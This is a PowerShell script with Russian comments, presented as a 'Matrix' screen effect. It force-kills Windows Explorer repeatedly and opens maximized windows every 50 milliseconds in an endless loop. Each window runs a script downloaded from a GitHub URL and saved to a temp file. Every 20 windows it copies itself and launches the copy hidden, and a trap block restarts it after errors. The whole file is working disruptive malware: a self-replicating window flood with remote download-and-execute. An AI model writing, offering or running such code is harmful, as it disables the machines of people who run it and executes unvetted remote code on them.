# Немедленно убиваем Explorer
Get-Process -Name "explorer" -ErrorAction SilentlyContinue | Stop-Process -Force

# Функция для создания матричного окна с настоящей матрицей
function New-MatrixWindow {
    param($windowId)
    
    $matrixUrl = "https://raw.githubusercontent.com/mathieures/Posh-Matrix/refs/heads/main/Start-Matrix.ps1"
    
    try {
        # Загружаем настоящий скрипт матрицы
        $matrixScript = Invoke-RestMethod -Uri $matrixUrl -ErrorAction Stop
        
        # Сохраняем во временный файл
        $tempScript = [System.IO.Path]::GetTempFileName() + ".ps1"
        Set-Content -Path $tempScript -Value $matrixScript
        
        # Запускаем настоящее окно матрицы
        Start-Process powershell -ArgumentList @(
            "-NoExit",
            "-WindowStyle", "Maximized",
            "-File", "`"$tempScript`""
        )
    }
    catch {
        # Fallback на локальную матрицу если не удалось загрузить
        $fallbackCode = @'
while ($true) {
    $w = $host.UI.RawUI.WindowSize.Width
    $chars = "01abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    
    for ($i = 0; $i -lt $w; $i++) {
        $char = $chars[(Get-Random -Minimum 0 -Maximum $chars.Length)]
        $color = @('Green','DarkGreen','White','Gray') | Get-Random
        Write-Host $char -ForegroundColor $color -NoNewline
    }
    Write-Host ""
    Start-Sleep -Milliseconds 30
}
'@
        $tempScript = [System.IO.Path]::GetTempFileName() + ".ps1"
        Set-Content -Path $tempScript -Value $fallbackCode
        
        Start-Process powershell -ArgumentList @(
            "-NoExit",
            "-WindowStyle", "Maximized",
            "-File", "`"$tempScript`""
        )
    }
}

# Главный бесконечный цикл
$count = 1
do {
    # Периодически закрываем Explorer (каждые 10 окон)
    if ($count % 10 -eq 0) {
        Get-Process -Name "explorer" -ErrorAction SilentlyContinue | Stop-Process -Force
    }
    
    # Создаем окно с настоящей матрицей
    New-MatrixWindow -windowId $count
    $count++
    
    # Быстрое создание окон
    Start-Sleep -Milliseconds 50
    
    # Создаем клон каждые 20 окон
    if ($count % 20 -eq 0) {
        $clonePath = "$env:TEMP\matrix_clone_$(Get-Random).ps1"
        Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $clonePath
        Start-Process powershell -ArgumentList @("-WindowStyle", "Hidden", "-File", "`"$clonePath`"")
    }
    
} while ($true)

# Вечная защита - самовосстановление при ошибках
trap {
    Start-Sleep -Seconds 3
    & $MyInvocation.MyCommand.Path
}
